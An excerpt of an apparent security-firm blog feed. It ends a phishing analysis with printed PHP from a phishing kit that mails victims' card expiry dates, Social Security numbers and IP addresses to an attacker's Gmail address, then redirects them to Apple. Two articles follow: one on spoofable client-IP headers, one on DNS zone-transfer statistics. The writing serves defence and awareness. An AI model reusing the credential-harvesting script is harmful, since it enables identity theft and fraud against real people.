&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Expiration Date             : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee7&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee8&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Social Security Number      : &amp;quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;donnee9&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;------------+| APpLe VBV |+------------&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Fr0m &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;            &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;


&lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;justforhacke@gmail.com&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilsub&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;Apple Result | Fr0m &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$ip&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;From: Apple Results &amp;lt;justforhacke@gmail.com&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;eMailAdd&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;MIME-Version: 1.0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$arr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;foreach&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$arr&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;mail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsnd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsub&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilsmg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$bilhead&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nb&quot;&gt;header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;Location:https://itunesconnect.apple.com/WebObjects/iTunesConnect.woa/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id=&quot;section-8&quot;&gt;釣魚郵件不死，別再把自己當成肥羊了！&lt;/h3&gt;

&lt;p&gt;釣魚攻擊最早從 1995 年就開始盛行，一直到快 20 年後的今天，都還是一個非常簡單又有效率的攻擊手法。收到郵件千萬別傻傻的輸入自己的個資、帳號密碼，仔細看一下攻擊者的破綻，別讓他得逞了。&lt;/p&gt;

&lt;p&gt;如果有發現疑似釣魚網站，又無法確認，可以到 &lt;a href=&quot;http://www.phishtank.com/&quot;&gt;PhishTank&lt;/a&gt; 來查查看，找到釣魚網站也可以投稿一下幫助其他人！&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>如何正確的取得使用者 IP？</title>
   <link href="http://devco.re/blog/2014/06/19/client-ip-detection/"/>
   <updated>2014-06-19T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/06/19/client-ip-detection</id>
   <content type="html">
&lt;p&gt;&lt;a href=&quot;https://farm7.staticflickr.com/6220/6250089499_f908fcb990_o.jpg&quot;&gt;&lt;img src=&quot;https://farm7.staticflickr.com/6220/6250089499_da2fb7a973_z.jpg&quot; alt=&quot;公車站牌的 IP&quot; /&gt;&lt;/a&gt;
&lt;!-- Photo Credit: https://www.flickr.com/photos/kevandotorg/6250089499/ --&gt;&lt;/p&gt;

&lt;p&gt;很多網站都會有偵測使用者 IP 的功能，不管是判斷使用者來自哪邊，或者是記錄使用者的位置。但是你知道嗎？網路上大多數的教學全部都是「錯誤」的。正確的程式寫法可以確保知道訪客的 IP，但是錯誤的寫法卻可能讓網站管理者永遠不知道犯罪者的來源。&lt;/p&gt;

&lt;p&gt;這次我們單就偵測 IP 的議題來探討各種錯誤的寫法。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;section&quot;&gt;你知道網路上的教學是不安全的嗎？&lt;/h3&gt;

&lt;p&gt;我們先來看一下網路上的教學，讓我們 Google 找一下「&lt;a href=&quot;https://www.google.com.tw/search?q=php+取得+ip&quot;&gt;PHP 取得 IP&lt;/a&gt;」，就可以看到許多人熱心的教學，我們隨意挑一個常見的教學來看看。&lt;/p&gt;

&lt;p&gt;以 PHP 為例：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;HTTP_CLIENT_IP&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
   &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;HTTP_CLIENT_IP&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
   &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;以 ASP.NET 為例：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c#&quot; data-lang=&quot;c#&quot;&gt;&lt;span class=&quot;n&quot;&gt;Dim&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientIP&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ServerVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;HTTP_X_FORWARDED_FOR&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientIP&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Empty&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Then&lt;/span&gt; 
 &lt;span class=&quot;n&quot;&gt;ClientIP&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ServerVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;REMOTE_ADDR&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;這是一個很基本的寫法、很正確的想法，如果 HTTP Header 中包含「Client-IP」，就先以他當作真實 IP。若包含「X-Forwarded-For」，則取他當作真實 IP。若兩者都沒有，則取「REMOTE_ADDR」變數作為真實 IP。因為當使用者連線時透過代理伺服器時，REMOTE_ADDR 會顯示為代理伺服器 Proxy 的 IP。部分代理伺服器會將使用者的原始真實 IP 放在 Client-IP 或 X-Forwarded-For header 中傳遞，如果在變數中呼叫則可以取得真實 IP。&lt;/p&gt;

&lt;p&gt;但是你知道嗎？&lt;strong&gt;網路上 80% 的教學寫法全部都是「錯誤」的。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;為什麼這樣說呢？請大家記得一件事情：「&lt;strong&gt;任何從客戶端取得的資料都是不可信任的！&lt;/strong&gt;」&lt;/p&gt;

&lt;h3 id=&quot;http-header&quot;&gt;竄改 HTTP Header&lt;/h3&gt;

&lt;p&gt;「X-Forwarded-For」這個變數雖然「有機會」取得使用者的真實 IP，但是由於這個值是從客戶端傳送過來的，所以「有可能」被使用者竄改。&lt;/p&gt;

&lt;p&gt;舉例來說，我寫了一個小程式，偵測這些常見的 HTTP Header 判斷 IP。並且使用 &lt;a href=&quot;http://portswigger.net/burp/&quot;&gt;Burp Suite&lt;/a&gt; 這個工具來修改 HTTP Request。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-OLYyle4PQ48/U5lB8SLR_DI/AAAAAAAAAc4/yHvzlGfNAAs/s2400/2014-06-12-client-ip-detection-01-detech-user-ip.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-OLYyle4PQ48/U5lB8SLR_DI/AAAAAAAAAc4/yHvzlGfNAAs/w897-h678-no/2014-06-12-client-ip-detection-01-detech-user-ip.png&quot; alt=&quot;顯示目前 IP 以及相關 header&quot; title=&quot;顯示目前 IP 以及相關 header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;頁面上顯示目前我目前的 IP「49.50.68.17」，並且其他的 header 是空的。但如果我今天使用 Burp Suite 之類的 Proxy 工具自行竄改封包，加上 X-Forwarded-For 或是 Client-IP header：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-GC77ijJxN-U/U5lB8NrnGwI/AAAAAAAAAdA/pqJDjoxUeu0/s2400/2014-06-12-client-ip-detection-02-burp-suite-add-http-header.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-GC77ijJxN-U/U5lB8NrnGwI/AAAAAAAAAdA/pqJDjoxUeu0/w744-h480-no/2014-06-12-client-ip-detection-02-burp-suite-add-http-header.png&quot; alt=&quot;使用 Burp Suite 修改 HTTP Request Header&quot; title=&quot;使用 Burp Suite 修改 HTTP Request Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;修改完畢之後，再到原本的顯示 IP 介面，會發現網頁錯將我竄改的 header 當作正確的資料填入。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh3.googleusercontent.com/-hHA7NtX_9KI/U5lB8Nn1VjI/AAAAAAAAAc0/umHpFoGWDDo/s2400/2014-06-12-client-ip-detection-03-detech-user-ip.png&quot;&gt;&lt;img src=&quot;https://lh3.googleusercontent.com/-hHA7NtX_9KI/U5lB8Nn1VjI/AAAAAAAAAc0/umHpFoGWDDo/w897-h678-no/2014-06-12-client-ip-detection-03-detech-user-ip.png&quot; alt=&quot;顯示遭到竄改的 HTTP Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;proxy-&quot;&gt;使用代理伺服器 Proxy 的情況&lt;/h3&gt;

&lt;p&gt;使用代理伺服器的情況下，HTTP Header 會有不同的行為。例如 Elite Proxy 如何隱藏客戶端的真實 IP。以下簡單介紹幾種常見的狀況給各位參考。&lt;/p&gt;

&lt;h4 id=&quot;proxy&quot;&gt;直接連線 （沒有使用 Proxy）&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: 客戶端真實 IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: 無&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: 無&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;transparent-proxy&quot;&gt;Transparent Proxy&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: 最後一個代理伺服器 IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: 代理伺服器 IP&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: 客戶端真實 IP，後以逗點串接多個經過的代理伺服器 IP&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;anonymous-proxy&quot;&gt;Anonymous Proxy&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: 最後一個代理伺服器 IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: 代理伺服器 IP&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: 代理伺服器 IP，後以逗點串接多個經過的代理伺服器 IP&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;high-anonymity-proxy-elite-proxy&quot;&gt;High Anonymity Proxy (Elite Proxy)&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: 代理伺服器 IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: 無&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: 無 (或以逗點串接多個經過的代理伺服器 IP)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;section-1&quot;&gt;實際情況&lt;/h3&gt;

&lt;p&gt;在我們測試的過程中，通常我們都會讓瀏覽器自帶 X-Forwarded-For，並且自行填入 IP。常常會發現有一些網站出現如下的警告…&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh4.googleusercontent.com/-mWMLyw8Z924/U5lB8y19t5I/AAAAAAAAAc8/PgGRibfggZM/s2400/2014-06-12-client-ip-detection-04-discuz-user-ip.png&quot;&gt;&lt;img src=&quot;https://lh4.googleusercontent.com/-mWMLyw8Z924/U5lB8y19t5I/AAAAAAAAAc8/PgGRibfggZM/w268-h139-no/2014-06-12-client-ip-detection-04-discuz-user-ip.png&quot; alt=&quot;Discuz! 顯示 IP 錯誤&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;有沒有搞錯？「上次登入位置 127.0.0.1」？沒錯，這個是知名論壇套件「&lt;a href=&quot;http://www.discuz.net/&quot;&gt;Discuz!&lt;/a&gt;」的功能，抓取 IP 的功能也是不安全的寫法。也有這樣的經驗，之前開著 X-Forwarded-For 的 header 到一些網站，竟然直接出現管理者後台！&lt;/p&gt;

&lt;p&gt;你覺得只有一般人撰寫的程式會有這樣的問題嗎？其實大型網站也可能會有類似的問題：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-4UPvfv9JbiM/U5p3CLiPXNI/AAAAAAAAAdU/Y6cNICTdCKk/s2400/2014-06-12-client-ip-detection-05-ruten-detect-user-ip.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-4UPvfv9JbiM/U5p3CLiPXNI/AAAAAAAAAdU/Y6cNICTdCKk/w752-h551-no/2014-06-12-client-ip-detection-05-ruten-detect-user-ip.png&quot; alt=&quot;露天拍賣顯示 IP&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;先不論為什麼 127.0.0.1 會在美國，這樣的寫法可能會讓管理者永遠抓不到犯罪者的真實 IP，甚至攻擊者可以竄改 header 插入特殊字元，對網站進行 SQL Injection 或者 Cross-Site Scripting 攻擊。&lt;/p&gt;

&lt;h3 id=&quot;section-2&quot;&gt;正確又安全的方式&lt;/h3&gt;

&lt;p&gt;「&lt;strong&gt;任何從客戶端取得的資料都是不可信任的！&lt;/strong&gt;」&lt;/p&gt;

&lt;p&gt;請各位開發者、管理者記住這個大原則，雖然這些 Request Header 可能含有真實 IP 的資訊，但是因為他的安全性不高，因此我們絕對不能完全信賴這個數值。&lt;/p&gt;

&lt;p&gt;那我們該怎麼處理呢？我的建議是記錄所有相關的 header 欄位存入資料庫，包含「REMOTE_ADDR」「X-Forwarded-For」等等，真正有犯罪事件發生時，就可以調出所有完整的 IP 資訊進行人工判斷，找出真正的 IP。當然從 header 存入的數值也可能會遭到攻擊者竄改插入特殊字元嘗試 SQL Injection，因此存入值必須先經過過濾，或者使用 Prepared Statement 進行存放。&lt;/p&gt;

&lt;p&gt;可以參考的 HTTP Header（依照可能存放真實 IP 的順序）
* HTTP_CLIENT_IP
* HTTP_X_FORWARDED_FOR
* HTTP_X_FORWARDED
* HTTP_X_CLUSTER_CLIENT_IP
* HTTP_FORWARDED_FOR
* HTTP_FORWARDED
* REMOTE_ADDR (真實 IP 或是 Proxy IP)
* HTTP_VIA (參考經過的 Proxy)&lt;/p&gt;

&lt;p&gt;「駭客思維」就是找出網站任何可能竄改的弱點，從網頁上的元素到 HTTP Header 都是嘗試的對象。因此身為防禦者一定要清楚的知道哪些數值是不能信賴的，不要再參考網路上錯誤的教學了！&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Zone Transfer Statistics of Alexa Top 1 Million</title>
   <link href="http://devco.re/blog/2014/06/13/zone-transfer-statistics-of-alexa-top-1m/"/>
   <updated>2014-06-13T00:00:00+08:00</updated>
   <id>http://devco.re/blog/2014/06/13/zone-transfer-statistics-of-alexa-top-1m</id>
   <content type="html">
&lt;h3 id=&quot;zone-transfer-&quot;&gt;Zone Transfer 世界大揭秘&lt;/h3&gt;

&lt;p&gt;還記得在上一篇文章 &lt;a href=&quot;http://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/&quot;&gt;Zone Transfer CVE-1999-0532 - 古老的 DNS 資安議題&lt;/a&gt;中我們曾提到，若對全世界的網站進行 zone transfer 檢測恐怕會有更多驚人的案例嗎？正好 &lt;a href=&quot;http://s3.amazonaws.com/alexa-static/top-1m.csv.zip&quot;&gt;Alexa 提供了全球排名前一百萬名的網站資料&lt;/a&gt;，我們就以這份資料為基礎來做一些統計吧！&lt;/p&gt;

&lt;h3 id=&quot;domain-&quot;&gt;有問題的 domain 總數與比例&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;79133，約佔所有受測目標的 8.014%&lt;/li&gt;
  &lt;li&gt;上述 domain 的所有 zone file 共含有 22631804 筆 DNS 記錄&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;由於在 Alexa Top 1M 中有許多資料是重複的 domain，另外也有些資料是 IP，在本次的檢測當中都不列入計算，因此受測 domain 總數僅有 987447 個，而非一百萬個。另外，本次掃描為求快速犧牲了部分準確率，因此實際數量應比 79133 更多。&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;top-level-domain-tld-&quot;&gt;有問題的 Top-Level Domain (TLD) 數量&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;全世界 TLD 總數：567&lt;/li&gt;
  &lt;li&gt;受測目標的 TLD 總數：316，佔全世界總數的 55.73%&lt;/li&gt;
  &lt;li&gt;有 zone transfer 問題的 TLD 總數：220，佔受測目標的 69.62%&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;目前 TLD 總數的數據取自於 &lt;a href=&quot;https://data.iana.org/TLD/tlds-alpha-by-domain.txt&quot;&gt;Internet Assigned Numbers Authority (IANA)&lt;/a&gt;，不了解 TLD 是什麼的人可以參考&lt;a href=&quot;http://en.wikipedia.org/wiki/Top-level_domain&quot;&gt;這篇維基百科文章&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;有趣的是，連一些新的 TLD 都有 zone transfer 問題，例如 .technology、.museum 等等，可見這真的很容易被大家忽略～&lt;/p&gt;

&lt;h3 id=&quot;tld-&quot;&gt;關於各個 TLD 的統計數據&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Transferable domain in this TLD：在特定 TLD 中，有多少 domain 可任意執行 zone transfer&lt;/li&gt;
  &lt;li&gt;Same TLD in Alexa top 1M：特定 TLD 在本次 987447 個受測目標中所佔的數量&lt;/li&gt;
  &lt;li&gt;Percentage of same TLD in Alexa top 1M：特定 TLD 在 Alexa top 1M 內所有同樣 TLD 所佔的百分比（例：.com 即為 35230 / 527203 = 6.68%）&lt;/li&gt;
  &lt;li&gt;Percentage of all transferable domain：某特定 TLD 可任意執行 zone transfer 的數量在本次所有可任意執行 zone transfer 所占的百分比（例：.com 即為 35230 / 79133 = 44.52%）&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;由於原始數據太多，因此本文僅列出前 25 名。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-taAD_Ilxm2c/U2mqBEzEx2I/AAAAAAAAAVY/Jv-_PR7i9xQ/w494-h750-no/zone-transfer-statistics-of-TLD.png&quot; title=&quot;Zone Transfer 問題的 TLD 相關統計&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-taAD_Ilxm2c/U2mqBEzEx2I/AAAAAAAAAVY/Jv-_PR7i9xQ/w494-h750-no/zone-transfer-statistics-of-TLD.png&quot; alt=&quot;Zone Transfer 問題的 TLD 相關統計&quot; title=&quot;Zone Transfer 問題的 TLD 相關統計&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;.tw 網域排第二十一名，幸好這次不是世界第一了，否則又是另類的台灣之光。&lt;/p&gt;

&lt;h3 id=&quot;name-server-&quot;&gt;關於 name server 的統計數據&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;Number of domain：該台 name server 有多少 domain 可任意執行 zone transfer&lt;/li&gt;
&lt;/ul&gt;

